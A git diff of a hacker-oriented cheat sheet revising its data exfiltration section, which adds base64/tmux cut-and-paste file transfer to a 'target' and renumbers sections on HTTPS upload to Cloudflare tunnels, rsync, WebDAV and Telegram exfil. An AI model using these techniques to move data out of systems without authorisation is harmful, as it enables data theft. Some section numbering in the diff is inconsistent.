@@ -45,6 +45,7 @@ Got tricks? Join us [https://thc.org/ops](https://thc.org/ops)
 1. [Data Upload/Download/Exfil](#exfil)
    1. [File Encoding/Decoding](#file-encoding)
    1. [File transfer using cut & paste](#cut-paste)
+   1. [File transfer using screen](#xfer-tmux)
    1. [File transfer using screen](#file-transfer-screen)
    1. [File transfer using gs-netcat and sftp](#file-transfer-gs-netcat)
    1. [File transfer using HTTP](#http)
@@ -1020,9 +1021,16 @@ nmap -p80 --script http-brute --script-args \
 
 ### 4.i File Encoding
 
-Encode binaries to text for transport via a terminal connection:
+Trick to transfer a file to the target when the target does not have access to the Internet: Convert the binary file into ASCII-text (base64) and then use cut & paste. (Alternatively use gs-netcat's elite console with `Ctrl-e c` to transfer file over the same TCP connection.)
 
-#### UU encode/decode
+Use `xclip` (on your workstation) to pipe the encoded data straight into your clipboard:
+```shell
+base64 -w0 </etc/issue.net | xclip
+```
+
+
+
+#### >>> UU encode/decode
 
 ```sh
 ## uuencode 
@@ -1041,12 +1049,10 @@ uuencode /etc/issue.net issue.net-COPY
 ## uudecode (cut & paste the 3 lines from above):
 uudecode
 ```
-
-#### Openssl encode/decode
+#### >>> base64 encode/decode
 
 ```sh
-## openssl encode
-openssl base64 </etc/issue.net
+base64 -w0 </etc/issue.net 
 ```
 <details>
   <summary>Output - CLICK HERE</summary>
@@ -1055,14 +1061,27 @@ openssl base64 </etc/issue.net
 </details>
 
 ```sh
-## openssl decode (cut & paste the 1 line from above):
+base64 -d >issue.net-COPY
+```
+
+#### >>> Openssl encode/decode
+
+```sh
+openssl base64 </etc/issue.net 
+```
+<details>
+  <summary>Output - CLICK HERE</summary>
+
+> VWJ1bnR1IDE4LjA0LjIgTFRTCg==
+</details>
+
+```sh
 openssl base64 -d >issue.net-COPY
 ```
 
-#### xxd encode/decode
+#### >>> xxd encode/decode
 
 ```sh
-## xxd encode
 xxd -p </etc/issue.net
 ```
 <details>
@@ -1072,7 +1091,6 @@ xxd -p </etc/issue.net
 </details>
 
 ```sh
-## xxd decode
 xxd -p -r >issue.net-COPY
 ```
 
@@ -1088,8 +1106,33 @@ __EOF__  ### Finish your cut & paste by typing __EOF__
 ```
 
 ---
+<a id="xfer-tmux"></a>
+### 4.iii. File transfer - using *tmux*
+
+Start `tmux` on your workstation. Connect to your target by any means you like (ssh, gs-netcat, ...).
+
+#### From REMOTE to LOCAL (download)
+
+Use [Tmux-Logging](#tmux) to download large files from the target via the terminal to your workstation.
+
+#### From LOCAL to REMOTE (upload)
+
+Start your favorite decoding tool (base64) on the REMOTE:
+```shell
+# Use 'Ctrl-b $' to rename this tmux session to 'foo'
+base64 -d >screen-xfer.txt
+```
+
+On your workstation, and from a different terminal, send base64-encoded data. It will arrive on your REMOTE in `screen-xfer.txt`.
+```shell
+tmux send-keys -t foo "$(base64 -w64 </etc/issue.net)"$'\n'
+# Press 'Ctrl-d' in the receiving terminal.
+# Use -t foo:1.2 to send to a window #1 and pane #2 or use 'Ctrl-b ,' to rename the window
+```
+
+---
 <a id="file-transfer-screen"></a>
-### 4.iii. File transfer - using *screen*
+### 4.vi. File transfer - using *screen*
 
 #### From REMOTE to LOCAL (download)
 
@@ -1142,7 +1185,7 @@ Note: Two CTRL-d are required due to a [bug in openssl](https://github.com/opens
 
 ---
 <a id="file-transfer-gs-netcat"></a>
-### 4.iv. File transfer - using gs-netcat and sftp
+### 4.v. File transfer - using gs-netcat and sftp
 
 Use [gs-netcat](https://github.com/hackerschoice/gsocket) and encapsulate the sftp protocol within. Allows access to hosts behind NAT/Firewall.
 
@@ -1167,7 +1210,7 @@ gs-netcat >"FILENAME"  # When prompted, enter the SECRET from the sender
 
 ---
 <a id="http"></a>
-### 4.v. File transfer - using HTTPs
+### 4.vi. File transfer - using HTTPs
 
 #### Download from Server to Receiver:
 
@@ -1215,7 +1258,7 @@ curl -X POST  https://CF-URL-CHANGE-ME.trycloudflare.com/upload -F 'files=@myfil
 
 ---
 <a id="download"></a>
-### 4.vi. File download without curl
+### 4.vii. File download without curl
 
 Using Python, download only:
 ```sh
@@ -1286,7 +1329,7 @@ burl() {
 
 ---
 <a id="trans"></a>
-### 4.vii. File transfer using a public dump
+### 4.viii. File transfer using a public dump
 
 Cut & paste into your bash:
 ```sh
@@ -1309,7 +1352,7 @@ A list of our [favorite public upload sites](#cloudexfil).
 
 ---
 <a id="rsync"></a>
-### 4.viii. File transfer - using rsync
+### 4.ix. File transfer - using rsync
 
 Ideal for synchronizing large amount of directories or re-starting broken transfers. The example transfers the directory '*warez*' to the Receiver using a single TCP connection from the Sender to the Receiver.
 
@@ -1362,7 +1405,7 @@ Pro Tip: Lazy hackers just type `exfil` on segfault.net.
 
 ---
 <a id="webdav"></a>
-### 4.ix. File transfer - using WebDAV
+### 4.x. File transfer - using WebDAV
 
 On the receiver (e.g. segfault.net) start a Cloudflare-Tunnel and WebDAV:
 ```sh
@@ -1400,7 +1443,7 @@ net use * \\example-foo-bar-lights.trycloudflare.com@SSL\sources
 
 ---
 <a id="tg"></a>
-### 4.x. File transfer to Telegram
+### 4.xi. File transfer to Telegram
 
 There are [zillions of upload services](#cloudexfil) but TG is a neat alternative. Get a _TG-Bot-Token_ from the [TG BotFather](https://www.siteguarding.com/en/how-to-get-telegram-bot-api-token). Then create a new TG group and add your bot to the group. Retrieve the _chat_id_ of that group:
 ```sh
